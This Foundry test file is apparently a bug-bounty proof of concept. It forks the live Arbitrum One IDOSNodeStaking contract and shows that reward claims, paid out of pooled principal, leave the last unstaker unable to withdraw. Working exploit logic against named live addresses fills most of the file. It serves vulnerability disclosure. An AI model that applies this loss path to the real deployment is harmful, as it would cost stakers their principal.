// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IDOSNodeStaking} from "../src/IDOSNodeStaking.sol";

/// Fork validation of F-B against the LIVE Arbitrum One deployment.
/// Deployed: IDOSNodeStaking 0x6132F2EE66deC6bdf416BDA9588D663EaCeec337
///           IDOSToken      0x68731d6F14B827bBCfFbEBb62b19Daa18de1d79c
/// Read-only fork + local simulation (no live tx), per program rules.
contract IDOSNodeStaking_ForkPoC is Test {
    IDOSNodeStaking constant STAKING = IDOSNodeStaking(payable(0x6132F2EE66deC6bdf416BDA9588D663EaCeec337));
    IERC20 constant IDOS = IERC20(0x68731d6F14B827bBCfFbEBb62b19Daa18de1d79c);

    address node = makeAddr("forkNode");
    address alice = makeAddr("forkAlice");
    address bob = makeAddr("forkBob");

    function setUp() public {
        // Public Arbitrum One RPC; falls back to env ARBITRUM_ONE_RPC_URL if set.
        string memory rpc = vm.envOr("ARBITRUM_ONE_RPC_URL", string("https://arb1.arbitrum.io/rpc"));
        vm.createSelectFork(rpc);
    }

    function _liveActiveStake() internal view returns (uint256 t) {
        IDOSNodeStaking.NodeStake[] memory ns = STAKING.getNodeStakes();
        for (uint256 i; i < ns.length; i++) t += ns[i].stake;
        IDOSNodeStaking.NodeStake[] memory ss = STAKING.getSlashedNodeStakes();
        for (uint256 i; i < ss.length; i++) t += ss[i].stake;
    }

    /// Confirm we are bound to the real deployed contract (immutables + non-empty code).
    function test_fork_identityAndLivePosture() public view {
        assertGt(address(STAKING).code.length, 0, "no code at staking address");
        assertEq(address(STAKING.idosToken()), address(IDOS), "idosToken mismatch");
        assertEq(uint256(STAKING.EPOCH_LENGTH()), 1 days, "EPOCH_LENGTH");
        assertEq(uint256(STAKING.UNSTAKE_DELAY()), 14 days, "UNSTAKE_DELAY");

        uint256 bal = IDOS.balanceOf(address(STAKING));
        uint256 stakeTot = _liveActiveStake();
        console.log("LIVE idosToken balanceOf(staking):", bal);
        console.log("LIVE total active+slashed stake   :", stakeTot);
        console.log("LIVE reward buffer (bal - stake)  :", bal >= stakeTot ? bal - stakeTot : 0);
        console.log("LIVE deficit (stake - bal)        :", stakeTot > bal ? stakeTot - bal : 0);
        console.log("LIVE currentEpoch                 :", uint256(STAKING.currentEpoch()));
    }

    /// Reproduce F-B on the real contract+token: a reward claim is paid from the shared balance and drives the
    /// contract below its principal obligations, so the last unstaker's principal becomes unavailable.
    ///
    /// The underlying defect (rewards paid from the same balance as principal, with no reward reserve and no
    /// solvency check) is shown most cleanly by the LOCAL PoC with zero reward funding. Here, to make the loss
    /// deterministic on a fork (independent of the live participant set, timing and current rate), we use two
    /// dominant simulated stakers and compress many under-funded epochs into one elevated-rate epoch via an
    /// owner `setEpochReward` call. That owner call is a DETERMINISTIC ACCELERATOR, not the exploit premise:
    /// once the contract is underfunded relative to accrued rewards, the loss path itself is permissionless.
    function test_fork_rewardClaimEatsPrincipal() public {
        address owner = STAKING.owner();
        uint256 liveBal = IDOS.balanceOf(address(STAKING));

        // Two dominant test stakers so the outcome is deterministic regardless of the live participant set.
        uint256 X = 100_000_000e18; // 100M IDOS each (> live ~26.4M total stake)

        // owner-only setup: unpause if needed, allowlist a node, raise the per-epoch reward rate.
        // (Deterministic accelerator only — see the local PoC for the no-funding scenario with no owner action.)
        vm.startPrank(owner);
        if (STAKING.paused()) STAKING.unpause();
        STAKING.allowNode(node);
        STAKING.setEpochReward(2 * X); // owner-set reward rate, not backed by any deposited reward funding
        vm.stopPrank();

        // fund + stake (real token transfers into the real contract)
        deal(address(IDOS), alice, X);
        deal(address(IDOS), bob, X);
        vm.prank(alice); IDOS.approve(address(STAKING), X);
        vm.prank(bob); IDOS.approve(address(STAKING), X);
        vm.prank(alice); STAKING.stake(alice, node, X);
        vm.prank(bob); STAKING.stake(bob, node, X);

        uint256 balAfterStakes = IDOS.balanceOf(address(STAKING));
        assertEq(balAfterStakes, liveBal + 2 * X, "balance == prior + our principal");
        console.log("balance after our stakes:", balAfterStakes);

        // advance one full epoch so epoch rewards become claimable
        vm.warp(block.timestamp + 1 days + 1);

        (uint256 aliceReward,,,) = STAKING.withdrawableReward(alice);
        console.log("alice withdrawable reward (1 epoch):", aliceReward);
        assertGt(aliceReward, 0, "no reward accrued");

        // alice claims her reward -> paid out of the SHARED balance (no segregation)
        vm.prank(alice); STAKING.withdrawReward();
        uint256 balAfterClaim = IDOS.balanceOf(address(STAKING));
        console.log("balance after alice's reward claim:", balAfterClaim);

        // now both unstake their full principal and wait the 14-day delay
        vm.prank(alice); STAKING.unstake(node, X);
        vm.prank(bob); STAKING.unstake(node, X);
        vm.warp(block.timestamp + 14 days + 1);

        // alice withdraws her principal first
        vm.prank(alice); STAKING.withdrawUnstaked();

        // INVARIANT VIOLATION: the contract can no longer back all remaining principal — its balance is below
        // obligations, because alice's reward was paid out of the pooled principal (the documented invariant
        // that withdrawReward does not affect the principal stake is unenforced).
        uint256 balNow = IDOS.balanceOf(address(STAKING));
        console.log("contract balance now:", balNow);
        console.log("principal still owed to bob:", X);

        // bob, the last unstaker, cannot recover his principal from the contract's current balance.
        uint256 bobBefore = IDOS.balanceOf(bob);
        vm.prank(bob);
        vm.expectRevert(); // token transfer reverts: contract balance is insufficient for bob's principal
        STAKING.withdrawUnstaked();
        assertEq(IDOS.balanceOf(bob), bobBefore, "bob recovered nothing");
        assertLt(balNow, X, "balance < bob's owed principal -> insolvent for principal");
        console.log("bob's principal unavailable; balance short by:", X - balNow);

        // The loss is economic, recoverable only by external recapitalization: the revert rolls back the
        // deletion of bob's unstake entry, so once someone tops the contract back up, bob can withdraw again.
        deal(address(IDOS), address(STAKING), X); // simulate an external top-up / recapitalization
        vm.prank(bob);
        uint256 got = STAKING.withdrawUnstaked();
        assertEq(got, X, "after recapitalization, bob recovers his full principal");
        console.log("after external recapitalization, bob recovers principal:", got / 1e18, "IDOS");
    }
}
